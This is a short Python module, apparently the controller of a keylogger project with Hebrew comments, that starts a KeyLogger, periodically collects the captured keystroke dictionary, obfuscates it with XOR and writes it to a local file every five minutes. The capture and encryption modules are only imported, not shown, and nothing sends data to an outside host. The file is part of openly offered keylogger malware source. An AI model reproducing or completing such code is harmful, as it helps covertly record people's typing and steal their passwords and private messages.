from time import sleep

from keyLogger import *
from writer import *
from encryptor import *

class Manager:
    def __init__(self):
        KeyLogger().start_logging()

    def activity(self):
        count = 0
        while True:
            # קבלת הדיקט
            get_dict = DictWriter().get_dict()
            # הצפנת הדיקט
            dict_encrypt = XorEncryption().encryption(get_dict)
            # שליחת הדיקט לקובץ
            FileWriter().write(dict_encrypt)
            # המתן 5 דקות
            sleep(5 * 60)
            count += 1
            if count == 3:
                DictWriter()
                count = 0